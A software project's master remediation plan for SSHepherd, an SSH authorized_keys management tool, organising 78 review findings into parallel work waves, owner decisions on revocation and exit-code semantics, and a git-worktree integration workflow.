# Review remediation (78 findings) — Master Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking. Each wave runs as one Workflow (see "Execution model"); package agents never commit.

**Goal:** Fix or decide every one of the 78 confirmed findings from the 2026-11-07 whole-repo review (IDs `SEC-*`, `WP-*`, `ARC-*`, `COR-*`, `UX-*`, `PRD-*`, `TST-*`, `OPS-*`). The 55 that fit inside today's documented behavior are fixed in four waves of parallel work (W0–W3). The 23 that change product behavior, exit codes or the manifest schema get a short design spec and owner decisions first, and are then built in later slices (W4 and W5+). A handful of fixes that change an exit code or a documented promise inside a fix wave carry their own one-line owner question with a safe default (Block 2).

**Architecture:** 14 work packages (P01–P14): 10 fix packages and 4 spec packages. Packages in one wave (or one round of a wave) own **disjoint files**, so their agents run in parallel in git worktrees and hand back staged diffs that are filtered to their own files. One integrator per wave checks each diff's paths, applies them, runs `make check` and `make integration`, updates `README.md`/`CLAUDE.md`, and commits on `master` (one commit per package or lane). Independent verifiers, each in its own worktree at the committed SHA, then try to refute each fix, and a repair pass closes what they confirm. A CI preflight on a throwaway branch runs before W0 and W2 are pushed. Files that several packages need ("hot files") are handed from wave to wave in a fixed order. The two HIGH findings come first: TST-1 is fixed in W0 (P03), and PRD-1's spec is written in W0 (P04).

**Tech Stack:** Go 1.27.3 (`go.mod`; the Makefile pins `GOTOOLCHAIN=go1.27.3` through `GO_PIN`), Cobra v1.10.2, pflag v1.1.0, `golang.org/x/crypto/ssh` + `knownhosts`, `gopkg.in/yaml.v3`, the hermetic `internal/sshconn/sshtest` server, goleak, golden files (`-update`), native fuzzing, golangci-lint v2.15.0, Docker buildx, GitHub Actions, cosign.

**Inputs:** the review findings (`findings.json` in the review session's scratchpad: 78 entries with where/evidence/impact/fix/verifier) and the 14 package plans merged below. Line numbers are from `adee207` unless a package says otherwise. Every agent re-reads the cited code before editing, because earlier waves move lines. Function names are the stable anchors.

**Not in this plan (owner decision 2026-11-07, ON HOLD):** `prune`, `apply --force`, `import --prefer`, key generation and scheduled rotation, `move-key`, and the apply wipe/empty-server mode. Nothing below plans or re-proposes them. Where a finding's suggested fix overlaps one, only the part that fits the decision is planned (see "Findings folded into on-hold decisions").

**Revision 2026-11-07 (review panel):** this plan was reviewed by six reviewers (parallel execution, write-path security, testing, product/UX, ops/release, completeness). Every critique was checked against the plan and the code; accepted changes are folded in where they apply, and the "Review log" at the end lists what was accepted or rejected, per reviewer, with the reason.

---

## Overview

### What gets fixed

| Area | Fixed by | What changes for the user |
|---|---|---|
| `--help` regression (pflag v1.1.0) | P01 | Bool flags print as `--yes` again, and every `--help` is snapshot-tested against the README. |
| Release and supply chain | P02, P13 | Releases run only after CI, integration and image scans pass, from a tag on master. One image is built, then scanned, signed, attested and verified; tags move only after the digest is checked. Binaries carry a real version. |
| Write-path safety net | P03, P11 | The ownership refusals and the login probe are proven by tests. The write script backs up exactly what it checked, flushes per file (never a global `sync`), a refusal changes nothing (even through `..`), and the login check proves the key the next run uses. |
| Key options and adopt | P05 | One sshd option table. adopt no longer exits 3 with `bug:` on a strange server line. Include cycles can't hang import. |
| CLI messages | P06, P07 | Hints repeat your own flags, counts are pluralized, unknown keys show their comment, errors print once with one hint, `revoke --server` says what access is left, write-phase JSON errors keep their kind, and Ctrl-C stops queued audits. |
| Manifest writes | P12 | Every manifest write goes through one locked store, so `adopt --merge` can't undo a concurrent `revoke`. |
| CI hygiene | P13 | Integration files are linted from W0 on, every fuzz target runs daily with a kept corpus, three sshd distros, license and history scans. |
| Layering | P14 | Error kinds live in a leaf package, `apply` imports no transport, the write workflow leaves `package main`, and depguard enforces it. |
| Product decisions | P04, P08, P09, P10 | Specs plus owner decisions (revocation memory, write-failure semantics, audit trust, access model). |

### Waves

```
 Pre-W0: commit this plan + .gitignore .claude/worktrees/  (main session)
 W0 (parallel)            W1 (parallel, 2 rounds)     W2 (parallel, 2 rounds)      W3 (alone)        W4 (alone)          W5+
 ┌──────────────────┐     ┌──────────────────────┐    ┌────────────────────────┐   ┌─────────────┐   ┌───────────────┐   ┌───────────────┐
 │ P01 --help        │──┐  │ P05 options/adopt     │──┐ │ P11 write-path          │   │ P14 layering │   │ P04-impl       │   │ P08-impl       │
 │ P02 release/CI    │  ├─▶│ P06 CLI messages      │  ├▶│ P12-A/B store, revoke   │──▶│ + coverage   │──▶│ revocation     │──▶│ P09-impl       │
 │ P03 write tests   │  │  │ P07 reports/hints     │  │ │ P13-A/B/C CI hygiene    │   │ ratchet      │   │ memory         │   │ P10 spec, then │
 │ P13-0 OPS-7 lint  │  │  │ P08 spec  P09 spec    │  │ │ round 2: P12-C, P13-B/D │   └─────────────┘   └───────────────┘   │ slices S1–S6   │
 │ P04 spec (PRD-1)  │  │  │ round 2: P07-F1       │  │ └────────────────────────┘                                          └───────────────┘
 └──────────────────┘  │  └──────────────────────┘  │
   owner: D6 ──────────┴── D27 before W1 ───────────┴── D8, D8a, D30, D31, D7 before W2 ── Block 1 (D28…D1e) before the W4 plan
```

### Findings per wave

| Wave | Packages | Fix findings | Spec findings | Total |
|---|---|---:|---:|---:|
| W0 | P01, P02, P03, P13-0 (OPS-7 of P13) (fix); P04 (spec) | 15 | 4 | 19 |
| W1 | P05, P06, P07 (fix); P08, P09 (spec) | 16 | 11 | 27 |
| W2 | P11, P12, P13 (remaining six) | 19 | — | 19 |
| W3 | P14 (fixed order) | 5 | — | 5 |
| W4 | P04-impl (the 4 W0 spec findings are built here) | — | (4) | — |
| after W4 | P10 spec (roadmap) | — | 8 | 8 |
| W5+ | P08-impl, P09-impl, P10 slices (the 19 W1/P10 spec findings are built here) | — | (19) | — |
| **All** | 14 packages | **55** | **23** | **78** |

Severity: 2 HIGH (PRD-1, TST-1), 21 MEDIUM, 55 LOW. The full map is in "Finding → package coverage".

---

## Owner decisions

### Answers recorded (2026-11-07)

Agents: these are final — implement the recommended option for each; do not re-ask.

| ID | Answer |
|---|---|
| D0 | **Yes** — push a throwaway `preflight/<wave>` branch, wait for CI, delete it, then push master (W0, W2). |
| D27 | **Yes** — a malformed `expiry-time` fails the manifest load like an unknown option (P05 Task 2 main diff). |
| D6 | **Done** — tag ruleset 26768538 "protect release tags" (refs/tags/v*: creation, update, deletion, non-fast-forward; bypass: repo admin). No required checks on master. Owner still sets the GHCR package public + linked before the first tag. |
| D8 | **Yes** — `adopt --partial` exits 1 when some servers were unreadable (manifest still written). |
| D8a | **Yes** — `adopt` exits 3 and writes nothing when zero servers were read. |
| D30 | **Yes** — apply refuses (exit 1, writes nothing) a no-grant server whose `authorized_keys2` holds keys. |
| D31 | **Yes** — the login probe offers keys in the same order later runs use (no `--identity` preference). |
| D7 | **(1)** — releases also publish signed binaries (plain `go build` matrix, `SHA256SUMS`, `cosign sign-blob`). |

Still open: Block 1 (D28, D1, D29, D2, D3, D4, D4b, D5, D1a, D1b, D1c, D2a, D4a, D4c, D1d, D1e) — needed before the W4 plan; D9 onward at their spec approvals.

**Answered 2026-11-07 (second sitting):**

| ID | Answer |
|---|---|
| D28 | Recommended: exit 2 = "a human must act now on security" for every command; one README exit-code table. |
| D1 | (1) `revoked:` list in the manifest. |
| D29 | Recommended: audit loads and reports policy conflicts as critical; apply skips the servers involved; validate/saving commands refuse. |
| D2 | Yes: a revoked key still installed is critical (exit 2). |
| D3 | (2) Post-revoke fleet check only with `--sweep`; otherwise print the exact audit command. |
| D4 | (1) Manifest serial; apply refuses servers written by a newer serial (removal-only writes never blocked). |
| D4b | Yes: a confirmed apply that removes keys bumps the serial and saves the manifest. |
| D5 | No wildcard: adopt always lists servers by name. |
| D1a | Yes: per-server revokes are remembered. |
| D1b | Yes: `revoke --key` of an unowned key records it. |
| D1c | Yes: re-running a revoke is idempotent (exit 0 + apply hint). |
| D2a | Yes: adopt skips a revoked key with a loud warning. |
| D4a | Yes: audit from an older copy reports drift (exit 1). |
| D9 | (1) Retry; if still unreachable keep the new file, report UNPROVEN (exit 1); post-login failures still undo. |
| D9b | Yes: warn-only `--identity` probe. |
| D10 | Yes: failed undo exits 2; retry the undo on a busy lock. |
| D14 | Yes: audit checks permissions/owners; world-writable is exit 2. |
| D15 | Yes: an operator key that cannot log in is critical. |
| D16 | Yes: a host-key type change is treated as a possible attack (exit 2). |
| D17 | Yes: offer only granted (+operator) keys; fallback to all with a warning; `--offer-all-keys`. |
| D18 | Yes: narrow the README "who can log in" claim now. |
| D19 | (1) Built-in key rules (DSA, RSA < 2048 = policy problem per D29; passed expiry-time warns). |
| D25 | Yes: `validate` and `audit --server` now, `grant` later. |
| D25a | **B (owner override): `validate --json` from day one.** |
| D25b | Yes to all three later ideas (maintenance flag, `grant`, "what changed" view), each with its own spec. |
| D23 | Yes: bastion/ProxyJump with strict host keys on both hops. |
| D24 | Yes: per-server `preserve:` rule (never writes a no-grant server). |
| D24a | Yes: comment matching allowed, with a README warning. |
| D26 | Yes: rename confusing flags before the first release (no aliases). |
| D21 | Yes: "protected" separate from "every server". |
| D21a | Yes: trim protected non-operators with `--operator`; operators stay refused. |
| D20 | Yes: server tags (`@prod`). |
| D20a | Yes: warn when `["*"]` reaches a root account. |
| D20b | Yes: user groups, after tags. |
| D22 | **B (owner override after discussion): optional per-grant restrictions; two grants giving one key different restrictions on the same server are refused with an explanation.** |

**New owner rule (2026-11-07): every command offers `--json`.** `validate` from day one (D25a); `import` and `adopt` get a JSON report too (new item, needs a short design: likely a discovery/warnings report, since their normal output is YAML) — schedule it as its own slice after W1.

| D4c | Recommended: exit 0 (converged) with "written by newer manifest serial S (yours is M): pull the latest manifest"; audit still reports drift (D4a). |
| D1d | Recommended: drift, exit 1, labelled `bob (access revoked <date>)` (critical is only for revoked keys, D2). |
| D1e | **B (owner, against the planner's recommendation, for consistency with D29):** an access tombstone naming a server no longer in `servers:` is a **warning** and that entry is ignored for that server — not a load error. |

All decisions answered (D0–D31 incl. sub-decisions, D4c, D1d, D1e). D11–D13 and the D14a–c / D17a–b spec defaults stand unless the owner changes them at spec approval.

**W0 verifier follow-ups (unconfirmed single-lens, triaged by the main session):**
- P04 spec line ~275 (`S < M, or no serial | equal | Converged`): an affected, already-converged server keeps an old/absent serial, so a stale copy can still re-grant there (PRD-2 hole). Fix in the spec before the W4 plan: on an affected server, an older serial with an equal body gets a header-only write carrying M when the run bumped the serial; drop `TestPlanConvergedOnOlderSerialSameBody` as written.
- P04 spec: D4a/D1a question cells and a missing safe-default column (wording only).
- P03 `TestOwnerChecksBite` (sshwrite_test.go:758): mutants should require code 0 and the rendered file, not just "not 48"; and the comments/CLAUDE.md name `ownerMutants`, but the table is the local `mutants` map — W1 integrator fixes both (P03-owned test file, no other wave touches it before P07).

Rules: ask **one decision at a time**, in the order below, in short plain English, with the recommendation. Decisions are never delegated to agents. A decision that is not answered never blocks a fix wave: each package names its safe default (usually today's behavior). The quick questions that unblock W0–W2 come first; the revocation block (Block 1) is asked while W1–W3 run, because only the W4 plan needs it. Technical sub-choices that do not change what a user sees are decided by the spec author with a stated default and shown to the owner at spec approval; they are listed in the table so nothing is hidden.

| Order | ID | Needed by | Blocks | Safe default if unanswered |
|---:|---|---|---|---|
| 1 | D0 | before W0's push | the CI preflight branch | no preflight: push after local gates only |
| 2 | D27 | before W1 starts | P05 Task 2 | keep loading a bad `expiry-time` (complete alternate diff in P05 Task 2) |
| 3 | D6 | before W0's push | repo settings (owner action); first release | no release is tagged until it is answered |
| 4–5 | D8, D8a | before W2 | P12 Task 8 | today's adopt exit codes |
| 6 | D30 | before W2 | P11 Task 6 | Task 6 skipped (apply keeps exit 0) |
| 7 | D31 | before W2 | P11 Task 5 | Task 5 skipped (WP-5 waits) |
| 8 | D7 | before W2 | P13 Task 9 | image only |
| 9–24 | D28, D1, D29, D2, D3, D4, D4b, D5, D1a, D1b, D1c, D2a, D4a, D4c, D1d, D1e | before the W4 plan | P04-impl (W4) | W4 waits |
| 25–27 | D9, D9b, D10 (D11–D13 stated) | P08 spec approval | P08-impl (W5+) | — |
| 28–30 | D10a, D10b, D9c | P08 spec approval | P08-impl (W5+); no fix wave | D10a: exit 1; D10b: exit 1 (UNPROVEN); D9c: stderr only |
| 31–36 | D14, D15, D16 (re-asked), D17, D18, D19 (D14a–c, D17a–b spec defaults) | P09 spec approval | P09-impl (W5+); D18's README narrowing landed in 837fb49 | — |
| 37–49 | D25, D25a, D25b, D23, D24, D24a, D26, D21, D21a, D20, D20a, D20b, D22 | P10 spec approval (after W4) | P10 slices (W5+) | — |

### Block 0: workflow setup

**D0 — Before W0 and W2 are pushed to master, may the workflow push a throwaway `preflight/<wave>` branch to run CI on it (no PR), then delete it?**
- **Recommendation: yes.** Every CI and release change is otherwise tested only after it is live on master. It is not a feature branch: nothing merges from it.

### Block 2: small decisions the fix waves need (ask these first)

**D27 — A manifest key with a broken `expiry-time` (like `"2027"`) would stop the manifest from loading, like an unknown option. sshd already ignores that line, so the key never worked. OK?** (ARC-7, P05 Task 2)
- **Recommendation: yes.** If no, P05 keeps loading it and rotate still reports the bad value.

**D6 — Will you add a GitHub rule so only you can create, move or delete `v*` tags?** Agents can't change repo settings. (OPS-1)
- A tag runs the release workflow from the tagged commit, so a tag on an old commit would run the old, ungated workflow. The rule is therefore **needed before the first release**, and every release tag must point at or after the W0 release-gating commit (recorded in CLAUDE.md Status).
- Required checks on master are optional; you push straight to master, so a required check needs you as a bypass actor. If you add them, require only `ci-ok` (one stable name that later renames never break).
- **Recommendation: yes to the tag rule now; required checks later, if ever.** Also set the GHCR package public and linked to the repo before the first tag.

**D8 — When `adopt --partial` reads only some servers, should it exit 1 (like audit) instead of 0?** (UX-4)
- **Recommendation: yes.** Scripts should notice an incomplete result.

**D8a — When adopt can read none of the servers, should it stop with exit 3 and write nothing?** (UX-4)
- **Recommendation: yes.** Today it writes an empty result and exits 0.

**D30 — A server where nobody is granted but `authorized_keys2` still holds keys: should apply refuse it (exit 1, write nothing), so apply and audit agree?** (COR-2)
- **Recommendation: yes.** Today apply says "converged" (exit 0) while audit says drift (exit 1) forever. Refusing writes nothing, so it stays clear of the on-hold wipe mode.

**D31 — The login check after a write will try keys in the same order later runs use, so it proves the key the next run logs in with. It will no longer prefer your `--identity` file. OK?** (WP-5)
- **Recommendation: yes.** Today a key that gains a forced `command=` can pass the check and then capture every later session. A separate, warn-only check of the `--identity` key is D9b.

**D7 — Should releases also publish signed binaries (plus a `SHA256SUMS` file), not only the container image?** (OPS-10)
- Options: (1) Yes, with a plain `go build` matrix and `cosign sign-blob`. (2) Yes, using goreleaser. (3) No.
- **Recommendation: (1).** It matches the README's binary install path and adds no new tool. (2) means P13 Task 9 must be re-planned; (3) skips it. The version fix (P13 Task 8) lands in every case.

### Block 1: revocation memory (P04 spec; asked while W1–W3 run; gates the W4 plan)

**D28 — What should exit 2 mean for apply, revoke and rotate?** (SEC-2, WP-6; asked first, D3 and D10 build on it)
- **Recommendation:** the same as audit: "a human must act now on security" (a revoked key is still installed and was seen; a lockout could not be undone). One exit-code table for every command, written once in the README. Until it is answered, P06's `--help` footer simply lists 0, 1 and 3.

**D1 — Should the manifest remember keys you revoked, so adopt, import or a hand edit can never bring them back?** (PRD-1)
- Options: (1) Yes: a `revoked:` list in the manifest (fingerprint, user, date, reason). (2) Yes, but in a separate file. (3) No: only warn in the docs.
- **Recommendation: (1).** The manifest stays the single source of truth, git history shows every revoke, and this is the one HIGH product finding.

**D29 — When the manifest itself breaks a rule (a revoked key still listed, a hand grant over a revoked server, later a weak key), should every command stop, or should audit report it?** (PRD-1, PRD-10)
- Today's style would make the whole manifest fail to load, so a scheduled audit would exit 3 and report nothing about the fleet because of one line, and a manifest that loads today could stop loading after an upgrade.
- **Recommendation:** audit loads it and reports each problem as critical (exit 2); apply skips only the servers involved; `validate` and the commands that save the manifest refuse. Asked once; D1, D1a and D19 follow it.

**D2 — If audit finds a revoked key still on a server, should it be critical (exit 2)?** (PRD-1)
- **Recommendation: yes.** A revoked key that still works is exactly what monitoring must page on.

**D3 — After a revoke, should SSHepherd log in to every server to check the key is really gone?** (SEC-2)
- Cost: every revoke contacts the whole fleet; one unreachable server makes it exit 1; it can't run with `--no-apply`.
- Options: (1) Always. (2) Only with `--sweep`; otherwise print the exact `sshepherd audit` command to run. (3) No: keep today's hint.
- **Recommendation: (2).** With D2, a scheduled audit already pages on a revoked key, so a fleet-wide login on every revoke mostly repeats it. The sweep only reads (no `prune`).

**D4 — Should the manifest carry a serial number, so an old copy can't silently undo newer revokes?** (PRD-2)
- How it works: revoke and rotate bump `serial:`; it is written into each server's file header; apply refuses a server that shows a newer serial, **except** when the write only removes keys (no header can ever stop a removal). A serial far above yours counts as forged (audit exit 2).
- Limits, said plainly: a hand edit doesn't bump it (D4b); the escape hatch is editing `serial:` yourself; two branches can reach the same number.
- Options: (1) As above. (2) Lighter: audit and apply only warn. (3) No: rely on git.
- **Recommendation: (1).** Also, regardless of this answer, W1 changes the Quick start to save the manifest, push it, then apply (P06 Task 9), which closes most of the gap today.

**D4b — A hand edit that removes a key doesn't bump the serial. Should apply bump it when a confirmed write removes keys?** (PRD-2)
- **Recommendation: yes.** Otherwise the normal "edit the YAML in a PR" path leaves old copies able to re-grant. Cost: apply then also saves the manifest file (through the same locked store as revoke).

**D5 — When adopt finds an unknown key on every server, should it write `servers: ["*"]`, which also grants every future server?** (SEC-3)
- **Recommendation: no, always list the servers by name.** An unknown key should never reach servers that don't exist yet.

**D1a — `revoke bob --server db-1` leaves no trace, so a later `adopt --merge` that finds bob's key on db-1 gives it back. Remember that too?** (PRD-1)
- **Recommendation: yes.** adopt and import will never give bob db-1 again until you delete that entry.

**D1b — `revoke --key` of a key nobody in the manifest has any more is refused today. Should it record the revoke instead?** (PRD-1)
- **Recommendation: yes.** It changes no server; it tells you which servers still have the key (through audit, or the sweep with `--sweep`). Not `prune`.

**D1c — Re-running a revoke for someone already revoked: exit 0 with the "run apply" hint, instead of today's error?** (UX-6)
- **Recommendation: yes,** using the revoked list to know they were revoked. A name that was never in the manifest still errors.

**D2a — When adopt finds a revoked key, should it skip it with a loud warning (exit code unchanged)?** (PRD-1)
- **Recommendation: yes.**

**D4a — Audit sees a server written by a newer manifest than yours. Should it say so and count it as drift (exit 1)?** (PRD-2)
- **Recommendation: yes:** "written by manifest serial 8, yours is 7: pull the latest manifest".

**D4c — apply meets a server written by a newer manifest whose keys already match yours. Exit 0 or 1?** (PRD-2; was the spec's open point 4)
- **Recommendation: exit 0 (converged), with the note** "written by newer manifest serial S (yours is M): pull the latest manifest". Nothing would change, and audit still counts it as drift (D4a). Otherwise: exit 1, refused, so apply and audit agree.

**D1d — audit finds bob's key on db-1 after `revoke bob --server db-1`. Drift (exit 1) or critical (exit 2)?** (PRD-1; was open point 6)
- **Recommendation: drift, exit 1**, labelled `bob (access revoked 2026-11-08)`. Bob is still trusted on his other servers; critical is for revoked keys (D2).

**D1e — A server named in an access tombstone is removed from `servers:`. Does the manifest still load?** (PRD-1; was open point 7)
- **Recommendation: no, a load error** (`revoked[N]: unknown server "NAME"`, exit 3), so a typo never silently protects nothing. Otherwise: a warning, and the entry is ignored for that server.

### Block 3: write-path failure semantics (P08 spec; implementation W5+)

Ask in this order: D9 → D9b → D10 → D10a → D10b → D9c. D10's meaning depends on D9 and on D28.

**D9 — If the login check after a write can't even log in because of the network (the server never answered), should SSHepherd undo the write?** (WP-1)
- Options: (1) Retry a few times; if it still can't log in, keep the new file and report UNPROVEN (exit 1). Anything that goes wrong after login (a forced command, a hang) still undoes the write. (2) Retry, then undo. (3) Keep today: undo on any failure.
- **Recommendation: (1).** Undoing can put a revoked key back.

**D9b — Should the login check also try your `--identity` key on its own, and only warn if that fails?** (WP-5 follow-up)
- **Recommendation: yes, warn only,** and only for key files with no restrictions on their line. It never undoes a write.

**D10 — If the login check fails and the undo also fails, so you might be locked out, should apply exit 2 so monitoring pages you?** (WP-6)
- **Recommendation: yes.** Also retry the undo when the lock is busy.

**D10a — If a failed login check undoes a write and the restored file lets in a key the manifest has revoked, should apply exit 2 at once, or exit 1 and leave the page to the next audit?** (WP-1; was the P08 spec's open point 1)
- Options: (1) Exit 1; the FAILED line names each key the rollback put back, and the next audit reports it as critical (D2). (2) Exit 2 at once.
- **Recommendation: (1)**, the default until answered. apply's exit 2 keeps one meaning ("you may be locked out"). Against it: a fleet audited daily may carry the revoked key for up to a day.

**D10b — If the login check right after a write meets a host-key alarm (the host key changed or is `@revoked`), should apply exit 2 the way audit does, or report UNPROVEN at exit 1?** (WP-1; was open point 2)
- Options: (1) UNPROVEN, exit 1, no retry, file kept. (2) Exit 2 for the host-key kinds audit exits 2 on.
- **Recommendation: (1)**, the default until answered; the next audit exits 2 on the same alarm. Against it: a scheduled apply alone does not page.

**D9c — When D9b's extra login check with only your `--identity` key fails, should `--json` carry the warning too, or only stderr?** (WP-5 follow-up; was open point 3)
- Options: (1) Stderr only. (2) An additive per-server `warnings` array (schema stays 1).
- **Recommendation: (1)**, the default until answered. Against it: a script that reads only the JSON never sees the warning.

None of D10a, D10b and D9c blocks a fix wave.

**Stated, not asked (recorded in the P08 spec; you can change them at spec approval):** D11 (WP-7) a lock records who and when, shows its age and the exact removal command, and is never removed automatically; D12 (WP-2) no server-side watchdog, a notice on the first Ctrl-C, and a reconnect-and-recheck under the lock after a broken connection; D13 (WP-8) a moved-aside `authorized_keys2` is never overwritten, and `authorized_keys` is not rewritten (so `.bak` is not rotated) when it already matches, which is what README already promises.

### Block 4: audit trust and connection posture (P09 spec; implementation W5+, after P14)

**D14 — Should audit check file and folder permissions and owners, the way apply does before writing?** (SEC-1)
- **Recommendation: yes:** a new "unsafe permissions" drift at exit 1, and exit 2 when something is world-writable. Spec defaults D14a (root-owned file is fine), D14b (a failed check marks the server unreachable), D14c (paths outside `$HOME` are walked to `/`).

**D15 — An operator key that is on a server but cannot log in (marked `cert-authority` or `principals=`): critical (exit 2)?** (COR-5)
- **Recommendation: yes.** A key that can't log in is the same as a missing one.

**D16 (re-asked with corrected options) — A server suddenly shows a different kind of host key than the one you saved. Treat it as a possible attack (exit 2)?** (COR-6)
- **Recommendation: yes.** (The earlier option "only accept recorded types, like OpenSSH" was wrong: OpenSSH only reorders types, and restricting would just turn the alarm into an exit-1 handshake error. Details in P09.)

**D17 — Should each server only see the keys the manifest grants there (plus operator keys)?** (SEC-5)
- **Recommendation: yes, one rule on every command.** If none of your loaded keys is granted on a server (normal right after `import --servers-only`), all of them are offered with one warning. `--offer-all-keys` turns the filter off. Spec defaults D17a (the flag exists on all five commands, off by default) and D17b (a preflight warning when no loaded key is granted anywhere).

**D18 — The README says audit answers "who can log in", but it only reads the managed files. Narrow the claim now, and add a deeper opt-in check later?** (PRD-9)
- **Recommendation: yes.** The narrowing is a doc-only change that the next integrator applies (README:37, README:268-272, CLAUDE.md "Core capabilities → Audit"; exact wording in P09).

**D19 — Should weak or expired keys be flagged?** (PRD-10)
- Options: (1) Built-in rules: DSA and RSA under 2048 bits are policy problems (handled as D29 says: audit reports them as critical, apply skips those servers, a manifest that loads today keeps loading); a passed `expiry-time` warns. (2) A configurable `policy:` block. (3) No key rules.
- **Recommendation: (1).** Key age, an `added:` date and "overdue for rotation" are excluded because they overlap the on-hold scheduled rotation.

### Block 5: access model and fleet reach (P10 roadmap spec, after W4; each answer becomes its own slice)

Ask in this order (by value): D25 → D23 → D24 → D26 → D21 → D20 → D20b → D22, each sub-question right after its parent.

**D25 — Add `validate` (offline manifest check) and `audit --server` now, `grant` later?** (PRD-11) **Recommendation: yes.** → slice S1. **D25a** — `validate --json` in the first slice? Recommend no. **D25b** — are `maintenance: true`, a `grant` command and a "what changed since HEAD" view wanted later? Recommend later, each with its own spec.

**D23 — Should SSHepherd support bastion (jump) hosts, with strict host-key checks on both hops?** (PRD-3) **Recommendation: yes.** Most real fleets sit behind a bastion. → slice S5.

**D24 — When another tool also writes `authorized_keys` (cloud agents, gitlab-shell), should a per-server `preserve:` rule keep its lines?** (PRD-8) **Recommendation: yes.** It keeps the "never write a server with no desired keys" rule, so it can't bring back the on-hold wipe mode. → slice S6. **D24a** — allow matching by key comment (anyone who can write the comment keeps a key)? Recommend yes, with a README warning.

**D26 — Rename the confusing flags (`--operator`, `--merge`, `--server`) now? No release has shipped, so no old-name aliases are needed.** (UX-7) **Recommendation: yes.** → slice S2. (The "keeps access to N other servers" line already landed in W1.)

**D21 — Should "protected key" and "installed on every server" be two separate ideas, so `except:` works for operator keys?** (PRD-7) **Recommendation: yes.** → slice S4. **D21a** — may `revoke --server` trim a protected non-operator user with `--operator`? Recommend yes; an operator stays refused.

**D20 — Do you want tags on servers, so access can say "@prod" instead of `["*"]` (which also covers root and service accounts)?** (PRD-5) **Recommendation: yes.** → slice S3a. **D20a** — warn when `["*"]` covers a `root` account? Recommend yes.

**D20b — Do you want groups of users, so access can say "team web"?** (PRD-4) **Recommendation: yes, after tags.** → slice S3b. The spec defines how a D1a revoke applies to group- and tag-derived grants.

**D22 — Should one key carry different restrictions on different servers?** (PRD-6) **Recommendation: not now.** A second key works today and keeps the model simple.

### Follow-up candidates (not decisions yet; raise only after the waves above)

- **Audit "ignored by sshd" drift class** (from P05): audit still counts a line sshd ignores as an installed key. A new drift class needs a short decision.
- **Former owner in a standalone audit** (from P07): once D1's `revoked:` list exists, audit can label `(unknown)` keys as `alice (revoked)`.
- **F-ARC-4b** (from P14): move the revoke/rotate presentation (`EditSummary`, `RenderEditHeader`, `EditPrompt`, the text/JSON renderers) out of `internal/apply` into its own package, keeping goldens byte-identical. ARC-4 is only **partly** fixed by P14 S3 (the transport half); this is the other half, raised after W4 for the owner to schedule.

---

## Execution model

### Pre-W0 (main session, once)

- [ ] Commit this plan on master: `git add docs/superpowers/plans/2026-11-07-review-remediation.md .gitignore && git commit -m "docs(plan): review remediation master plan"` with the attribution trailer. Agents in worktrees see only committed files, so an untracked plan is invisible to them.
- [ ] In the same commit, add `.claude/worktrees/` to `.gitignore` (today `git check-ignore -v .claude/worktrees/x/foo.go` prints nothing). Otherwise the main checkout's `git status` is dirty while lanes run, `gofmt -l .` sees agents' half-written files, and `gitleaks dir --redact .` scans copies of `internal/keyfile/testdata` keys that the root-anchored allow-list (`^internal/keyfile/testdata/`) does not match.
- [ ] Rule for every later spec and per-slice plan: it is committed before the wave that runs it.
- [ ] Ask D0, D27 and D6 (Block 0/2).

### Roles

| Role | Runs where | May write | Never |
|---|---|---|---|
| **Scout** (first workflow agent) | main checkout, read-only | nothing; returns `baseSha` | edit, commit |
| **Package agent** (one per package lane) | its own git worktree (`isolation: 'worktree'`), checked out at the round's `baseSha` | only the files its lane owns in this round; README/CLAUDE.md text goes in `docsDelta`, never in the patch | commit, push, hand back a foreign path |
| **Integrator** (one per wave round) | main checkout on `master` | the applied diffs, merge fixes in any file, `README.md`, `CLAUDE.md`, spec amendments | skip a gate, apply a patch with a foreign path, force-push |
| **Verifier** (several lenses per package) | its own worktree at the committed SHA | nothing that is handed back; lens 2 mutates only inside its own worktree | edit master, run `make check` (uses the integrator's gate output) |
| **Repair agent** (one per package with confirmed problems) | its own worktree at the latest `baseSha` | that package's files | commit |
| **Owner** | — | decisions, repo settings (D6), pushing if preferred | — |

Decisions and spec approvals are never delegated. A workflow stops at an owner decision and returns; the main session asks it, one question at a time.

### One wave, step by step

1. **Scout.** Confirms: the plan file and every spec/plan the wave runs are committed (`git ls-files --error-unmatch <path>`); `git status --porcelain` is empty (`.claude/worktrees/` is ignored); creating a throwaway worktree and running `make fmt secrets` in the main checkout stays green (proves the gates ignore worktrees); `master` holds the previous wave's commits; for every hot file this wave touches, the previous owner's commit is on master (`git log --oneline -1 -- <file>`); `make check` is green; each package's preconditions (its `depends_on` landed, its decisions answered or its safe default named). Returns `{ready, baseSha: $(git rev-parse master), blockers}`.
2. **Package agents, in parallel.** Each first checks `test -f "$PLAN"` (the plan path inside its own worktree) and `test "$(git rev-parse HEAD)" = "$BASE" || git checkout -q --detach "$BASE"`, and reports the base it used. Then it follows its package section: failing test → run (FAIL) → implement → run (PASS), for every task. It then stages, **drops every staged path outside its lane's file list** (including fuzz crashers and stubs), and writes one patch:
   ```sh
   git add -A
   git diff --cached --name-only | while read -r f; do
     ok=; for pat in $OWNED; do case "$f" in $pat) ok=1;; esac; done   # $OWNED: the lane's files as shell globs
     [ -n "$ok" ] || { git reset -q -- "$f"; echo "dropped foreign path: $f"; }
   done
   git diff --cached --binary > "$PATCH_DIR/<wave>-<pkg>-<lane>.patch"
   ```
   It returns the patch path, the base it used, the commands it ran with their results, a README/CLAUDE.md delta (exact text, samples copied from goldens or real output), and any breakage it saw in files it does not own (`foreignBreaks`, including any dropped path).
3. **Integrator.** For each lane, in the wave's merge order: reject the lane (report it blocked) if `git apply --numstat` lists any path outside that lane's `files`; otherwise
   ```sh
   git apply --index --3way "$PATCH_DIR/<wave>-<pkg>-<lane>.patch"
   make check
   ```
   Apply the wave's listed hand-offs, fix any test another package broke, apply that package's README/CLAUDE.md delta (re-copy samples from the regenerated goldens), update the CLAUDE.md Status paragraph, and commit once for the package (or lane, where the wave says so) on `master` with the attribution trailer. After the last package of the round: `make integration` (and after any package that touches the read/write path). No stub file may remain: `git ls-files | grep _stub.go` prints nothing. Returns the new `baseSha` for the next round.
